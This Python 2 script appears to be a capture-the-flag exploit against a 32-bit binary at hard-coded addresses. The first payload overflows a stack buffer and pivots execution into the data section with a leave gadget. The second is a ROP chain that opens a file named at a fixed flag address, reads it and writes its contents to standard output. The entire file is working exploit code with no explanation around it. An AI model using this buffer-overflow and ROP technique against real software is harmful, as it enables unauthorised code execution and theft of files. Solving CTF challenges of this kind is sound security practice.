from struct import pack

def pack32(data):
	"""pack 32-bit little-endian"""
	return pack('<I', data)

leave = 0x080484f8
flag_location = 0x080487d0
pppr = 0x0804879d
ppr = 0x0804879e
pr = 0x080483cd
open_addr = 0x08048420
read_addr = 0x080483e0
write_addr = 0x08048450
data_section = 0x0804a038
read_80_bytes = 0x804865c

payload2 = "AAAA"
payload2 += pack32(open_addr)
payload2 += pack32(ppr)
payload2 += pack32(flag_location)
payload2 += pack32(0)

payload2 += pack32(read_addr)
payload2 += pack32(pppr)
payload2 += pack32(3) # File descriptor
payload2 += pack32(data_section+64)
payload2 += pack32(0x10)

payload2 += pack32(write_addr)
payload2 += pack32(pppr)
payload2 += pack32(1) # File descriptor
payload2 += pack32(data_section+64)
payload2 += pack32(0x10)

payload2 += "AAAA"

payload  = "\x00" * (0x6c-4)
payload += pack32(data_section)
payload += pack32(read_80_bytes)
payload += pack32(leave)
payload += pack32(data_section)
payload += "AAAABBB"

#print len(payload)

print payload
print payload2
